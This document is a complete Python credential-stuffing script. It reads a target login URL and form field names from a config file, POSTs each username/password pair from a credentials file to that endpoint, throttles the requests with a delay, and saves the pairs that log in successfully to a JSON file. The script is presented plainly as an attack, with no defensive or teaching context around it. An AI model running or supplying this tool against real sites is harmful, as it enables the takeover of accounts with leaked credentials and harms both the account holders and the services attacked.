import string
import requests
import json
import time
import sys

#load attack configuration
config = json.load(open('config.json'))

requestURL = config[0]['requestURL']
formUsernameIdentifier = config[0]['formUsernameIdentifier']
formPassworodIdentifier = config[0]['formPassworodIdentifier']
sucessKey = config[0]['sucessKey']
requestDelay = int(config[0]['requestDelay'])

#load credentials
print('loading credentials.json')
credentials = json.load(open('credentials.json'))

print('Starting attack on ' + requestURL)

sucessList = []

#post each credential
for credential in credentials:
    print("stuffing " + credential["username"] + ' : ' + credential['password'] + "...")
    credObj = {
        formUsernameIdentifier: credential['username'],
        formPassworodIdentifier: credential['password']
    }
    response = requests.post(requestURL, allow_redirects=False, json=credObj)
    #server response 200 ok
    if response.status_code == requests.codes.ok:
    	print('response: ' + response.text)
    	#look for a sucessful login
    	if sucessKey in response.text:
    	    print('sucess')
    	    stdObj = {
    	    	"username": credential['username'],
    	    	"password": credential['password']
    	    }
    	    sucessList.append(stdObj)

    #delay before proceeding to next credential
    time.sleep(requestDelay)

#write sucessful creds to a file in json format
print("writing suceffuly stuffed credentials to sucess.json\nexiting...")
outFile = open('sucess.json', 'w', encoding='utf-8')
json.dump(sucessList, outFile, ensure_ascii=False, indent=4)
outFile.close
